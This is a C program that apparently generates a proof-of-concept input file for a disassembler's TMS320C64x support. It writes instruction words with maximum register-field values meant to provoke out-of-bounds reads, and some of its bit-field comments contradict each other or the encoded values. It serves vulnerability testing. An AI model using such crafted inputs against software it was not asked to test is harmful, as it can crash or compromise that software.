#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Header: 2 bytes little-endian architecture ID, 2 bytes little-endian mode flags
    uint16_t arch_id = 27;  // TMS320C64x
    uint16_t mode_flags = 0;
    fwrite(&arch_id, 2, 1, f);
    fwrite(&mode_flags, 2, 1, f);

    // Generate instructions with maximum register field values
    // that might trigger out-of-bounds access when combined with offsets
    
    // TMS320C64x instruction encoding patterns:
    // Pattern 1: 5-bit register field at position [22:18] with max value 0x1F
    // Pattern 2: 5-bit register field at position [17:13] with max value 0x1F
    // Pattern 3: 6-bit register field at position [12:7] with max value 0x3F
    // Pattern 4: 7-bit register field at position [6:0] with max value 0x7F
    
    uint32_t instructions[] = {
        // Opcode 0x0 (ADD family) with max register values
        0x00000000,  // base
        0x07C00000,  // src1=0x1F (bits 27:23)
        0x00F80000,  // src2=0x1F (bits 22:18)
        0x0003E000,  // dst=0x1F (bits 17:13)
        0x00001F80,  // reg6=0x3F (bits 12:7)
        0x0000007F,  // reg7=0x7F (bits 6:0)
        
        // Opcode 0x1 with max register values
        0x10000000,
        0x17C00000,
        0x10F80000,
        0x1003E000,
        0x10001F80,
        0x1000007F,
        
        // Opcode 0x2 with max register values
        0x20000000,
        0x27C00000,
        0x20F80000,
        0x2003E000,
        0x20001F80,
        0x2000007F,
        
        // Opcode 0x3 with max register values
        0x30000000,
        0x37C00000,
        0x30F80000,
        0x3003E000,
        0x30001F80,
        0x3000007F,
        
        // Opcode 0x4 with max register values
        0x40000000,
        0x47C00000,
        0x40F80000,
        0x4003E000,
        0x40001F80,
        0x4000007F,
        
        // Opcode 0x5 with max register values
        0x50000000,
        0x57C00000,
        0x50F80000,
        0x5003E000,
        0x50001F80,
        0x5000007F,
        
        // Opcode 0x6 with max register values
        0x60000000,
        0x67C00000,
        0x60F80000,
        0x6003E000,
        0x60001F80,
        0x6000007F,
        
        // Opcode 0x7 with max register values
        0x70000000,
        0x77C00000,
        0x70F80000,
        0x7003E000,
        0x70001F80,
        0x7000007F,
        
        // Opcode 0x8 with max register values
        0x80000000,
        0x87C00000,
        0x80F80000,
        0x8003E000,
        0x80001F80,
        0x8000007F,
        
        // Opcode 0x9 with max register values
        0x90000000,
        0x97C00000,
        0x90F80000,
        0x9003E000,
        0x90001F80,
        0x9000007F,
        
        // Opcode 0xA with max register values
        0xA0000000,
        0xA7C00000,
        0xA0F80000,
        0xA003E000,
        0xA0001F80,
        0xA000007F,
        
        // Opcode 0xB with max register values
        0xB0000000,
        0xB7C00000,
        0xB0F80000,
        0xB003E000,
        0xB0001F80,
        0xB000007F,
        
        // Opcode 0xC with max register values
        0xC0000000,
        0xC7C00000,
        0xC0F80000,
        0xC003E000,
        0xC0001F80,
        0xC000007F,
        
        // Opcode 0xD with max register values
        0xD0000000,
        0xD7C00000,
        0xD0F80000,
        0xD003E000,
        0xD0001F80,
        0xD000007F,
        
        // Opcode 0xE with max register values
        0xE0000000,
        0xE7C00000,
        0xE0F80000,
        0xE003E000,
        0xE0001F80,
        0xE000007F,
        
        // Opcode 0xF with max register values
        0xF0000000,
        0xF7C00000,
        0xF0F80000,
        0xF003E000,
        0xF0001F80,
        0xF000007F,
        
        // Additional patterns with cross-path bit set
        0x00001000,  // cross-path src2
        0x07C01000,  // max src1 + cross-path
        0x00F81000,  // max src2 + cross-path
        0x0003F000,  // max dst + cross-path
        0x00002F80,  // max reg6 + cross-path
        0x0000107F,  // max reg7 + cross-path
    };
    
    int num_instructions = sizeof(instructions) / sizeof(instructions[0]);
    for (int i = 0; i < num_instructions; i++) {
        uint32_t instr = __builtin_bswap32(instructions[i]);
        fwrite(&instr, 4, 1, f);
    }

    fclose(f);
    return 0;
}